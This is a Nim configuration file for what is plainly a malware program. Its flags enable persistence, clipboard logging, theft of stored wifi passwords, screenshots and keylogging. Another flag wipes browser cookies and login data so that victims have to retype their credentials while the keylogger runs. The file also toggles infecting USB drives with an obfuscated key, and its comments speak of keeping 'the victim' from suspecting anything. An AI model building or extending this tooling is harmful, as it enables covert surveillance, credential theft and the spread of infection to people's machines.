## this file contains flags and other options
## used by the program

## used for compile-time string encryption
## in this file
## DO NOT REMOVE
from functions/hideString import e

## persistenceThread is used for installing the program
## and starting it when the pc opens
## DEFAULT: true
const USE_PERSISTENCE_THREAD*: bool = false

## clipboardThread is used for logging the clipboard
## every time it changes
## DEFAULT: true
const USE_CLIPBOARD_THREAD*: bool = false

## wifiPasswordsThread is used for getting
## all the wifi passwords stored on user's pc
## DEFAULT: true
const USE_WIFI_PASSWORDS_THREAD*: bool = true

## windowNameThread is used for getting the active window name
## best used alongside keyloggerThread
## DEFAULT: true
const USE_WINDOW_NAME_THREAD*: bool = false

## screenshotThread is used for saving screenshots
## DEFAULT: true
const USE_SCREENSHOT_THREAD*: bool = false

## keyloggerThread is used for logging key presses
## DEFAULT: true
const USE_KEYLOGGER_THREAD*: bool = false

## browserThread is used for deleting cookies and login data
## so the user is forced to login back again
## best used alongside keyloggerThread
## DEFAULT: true
const USE_BROWSER_THREAD*: bool = false

## when `true` the program will remove files
## instead of renaming them
## use `false` only for testing purposes only so no data is lost
## DEFAULT: true
const UNSAFE_REMOVE_FILE*: bool = false

## infectThread is used for searching usb drives and infecting them
## DEFAULT: true
const USE_INFECT_THREAD*: bool = false

## the key files on a usb drive will be infected with
## YOU MUST add e before " to encrypt the key so it can't be read
## from the executable
const INFECT_ENCRYPTION_KEY*: string = e"abiestezeulmeu1"

## TODO: IMPLEMENT THE FOLLOWING LINES

type browserThreadStart = enum
  Always ## NOT RECOMMENDED
  Random ## 1 in 6 chance browserThread will start

## how the browserThread starts
## setting Always will delete browser files everytime the
## program starts, not recommended, the victim will suspect
## something's up immediately
## DEFAULT: Random
const BROWSER_THREAD_START_TYPE*: browserThreadStart = Random

type ExpireVerification* = enum
  LocalApi
  InternetApi

type Date* = object
  day: int
  month: int
  year: int

proc NewDate(day: int, month: int, year: int): Date =
  result = Date()

  result.day = day
  result.month = month
  result.year = year

const USE_EXPIRE_VERIFICATION*: bool = true

const EXPIRE_VERIFICATION_TYPE*: ExpireVerification = LocalApi

const EXPIRE_DATE*: Date = NewDate(20, 10, 2020)
